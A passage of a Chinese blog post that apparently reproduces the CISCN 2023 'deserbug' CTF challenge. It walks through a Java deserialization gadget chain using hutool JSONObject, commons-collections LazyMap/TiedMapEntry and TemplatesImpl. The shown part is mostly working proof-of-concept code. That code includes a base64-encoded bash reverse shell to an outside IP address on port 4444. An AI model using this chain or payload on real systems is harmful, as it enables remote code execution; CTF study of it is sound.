class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//恶意代码字节码</span></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\Java-study\\java-cc1\\target\\classes\\org\\example\\runtime.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="comment">//给templates链赋值</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过setter给myexpect赋值</span></span><br><span class="line">        <span class="type">Myexpect</span> <span class="variable">myexpect</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Myexpect</span>();</span><br><span class="line">        myexpect.setTargetclass(TrAXFilter.class);</span><br><span class="line">        myexpect.setTypeparam(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;);</span><br><span class="line">        myexpect.setTypearg(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line"><span class="comment">//		为了构造以下形式</span></span><br><span class="line"><span class="comment">//        Constructor con = TrAXFilter.class.getConstructor(new Class[]&#123;Templates.class&#125;);</span></span><br><span class="line"><span class="comment">//        return con.newInstance(new Object[]&#123;templates&#125;;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//通过LazyMap.decorate实例化LazyMap，触发jsonObject.put  将this.factory赋值为一个没用的</span></span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span>  <span class="operator">=</span> (LazyMap) LazyMap.decorate(jsonObject,transformer);</span><br><span class="line">        <span class="comment">//实例化TiedMapEntry为了触发lazyMap.get</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap , <span class="string">&quot;111&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        jsonObject.remove(<span class="string">&quot;111&quot;</span>);<span class="comment">//if (map.containsKey(key) == false)</span></span><br><span class="line">        setFieldValue(transformer,<span class="string">&quot;iConstant&quot;</span>,myexpect);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object val)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">dField</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        dField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        dField.set(obj, val);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-003830113.png" alt="image-003830113" /></p>
+<h2 id="问题解决"><a class="markdownIt-Anchor" href="#问题解决"></a> 问题&amp;解决</h2>
+<p>如何解决LazyMap#get中的value问题：<strong>value是如何等于myexpect的</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.map.containsKey(key)) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">            <span class="built_in">this</span>.map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.map.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>先创建了一个<code>ConstantTransformer transformer = new ConstantTransformer(1);</code></p>
+<p>然后在hashMap.put之前，为了防止<strong>在序列化的时候就会触发payload</strong>，我们需要使得this.factory为一个无用的值，这里直接在</p>
+<p><code>LazyMap.decorate(jsonObject,transformer);</code>传<code>new ConstantTransformer(1)</code>,value就返回1</p>
+<p>但在hashMap.put之后，我们需要改回来，改为<code>myexpect</code></p>
+<p>我们直接通过<code>setFieldValue(transformer,&quot;iConstant&quot;,myexpect);</code><strong>修改 <code>ConstantTransformer</code> 对象内部的 <code>iConstant</code> 字段的值为 <code>myexpect</code> 对象</strong>。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object iConstant;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constant)</span> &#123;</span><br><span class="line">        iConstant = constant;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其实就是把原本 <code>ConstantTransformer</code> 固定返回的 <code>1</code> 替换为 <code>Myexpect</code> 对象。</p>
+<hr />
+<h2 id="完整poc"><a class="markdownIt-Anchor" href="#完整poc"></a> 完整POC</h2>
+<p>进行反弹shell，这里我没VPS，就不跟了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CTF;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.json.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.app.Myexpect;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//恶意代码字节码</span></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\Java-study\\java-cc1\\target\\classes\\org\\example\\runtime.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="comment">//给templates链赋值</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过setter给myexpect赋值</span></span><br><span class="line">        <span class="type">Myexpect</span> <span class="variable">myexpect</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Myexpect</span>();</span><br><span class="line">        myexpect.setTargetclass(TrAXFilter.class);</span><br><span class="line">        myexpect.setTypeparam(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;);</span><br><span class="line">        myexpect.setTypearg(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line"><span class="comment">//        Constructor con = TrAXFilter.class.getConstructor(new Class[]&#123;Templates.class&#125;);</span></span><br><span class="line"><span class="comment">//        return con.newInstance(new Object[]&#123;templates&#125;;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//通过LazyMap.decorate实例化LazyMap，触发jsonObject.put  将this.factory赋值为一个没用的</span></span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span>  <span class="operator">=</span> (LazyMap) LazyMap.decorate(jsonObject,transformer);</span><br><span class="line">        <span class="comment">//实例化TiedMapEntry为了触发lazyMap.get</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap , <span class="string">&quot;111&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        jsonObject.remove(<span class="string">&quot;111&quot;</span>);<span class="comment">//if (map.containsKey(key) == false)</span></span><br><span class="line">        setFieldValue(transformer,<span class="string">&quot;iConstant&quot;</span>,myexpect);</span><br><span class="line">        <span class="type">byte</span>[] serialize = serialize(hashMap);</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(serialize));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object val)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">dField</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        dField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        dField.set(obj, val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplates() <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">template</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        template.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">block</span> <span class="operator">=</span> <span class="string">&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNzkuMjkuMTcwLzQ0NDQgMD4mIDE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;</span>;</span><br><span class="line">        template.makeClassInitializer().insertBefore(block);</span><br><span class="line">        <span class="keyword">return</span> template.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  <span class="type">byte</span>[] serialize(Object object) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">JAVA反序列化</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/JAVA%E5%AE%89%E5%85%A8/" rel="tag">JAVA安全</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/126839103p0master1200.jpg" data-sizes="auto" alt="JAVA反序列化-高版本JDK下的Spring原生链" class="lazyload">
+          
+        
+        <a href="/2025/09/29/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%AB%98%E7%89%88%E6%9C%ACJDK%E4%B8%8B%E7%9A%84Spring%E5%8E%9F%E7%94%9F%E9%93%BE/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            JAVA反序列化-高版本JDK下的Spring原生链
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/175514388679175514388612.jpg" data-sizes="auto" alt="Crypto-格密码" class="lazyload">
+        
+      
+      <a href="/2025/09/28/Crypto-%E6%A0%BC%E5%AF%86%E7%A0%81/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          Crypto-格密码
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text"> 源码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text"> 攻击利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3"><span class="toc-number">3.</span> <span class="toc-text"> 问题&amp;解决</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4poc"><span class="toc-number">4.</span> <span class="toc-text"> 完整POC</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "CISCN2023-deserbug复现",
+          url: "http://example.com/2025/09/29/CISCN2023-deserbug%E5%A4%8D%E7%8E%B0/",
+          excerpt: "",
+          description: "",
+          stripContent: "[TOC] 题目描述： 1231 . cn.hutool.json.JSONObject.put-&amp;gt;com.app.Myexpect#getAnyexcept2. jdk8u202  源码分析 题目给了源码  从附件中可以看到两个依赖，分别是common-colletions-3.2.2和hutool-all-5.8.18两个版本，首先能够想到的就是常规的CC链子，需要注意的是这里使用的是CC3.2.2，比我们漏洞百出的3.2.1多了一个小版本，换上这个小版本对之前的东西进行复现发现会出现",
+          date: "Mon Sep 29 2025 09:23:05 GMT+0800",
+          updated: "Wed Dec 17 2025 00:25:45 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
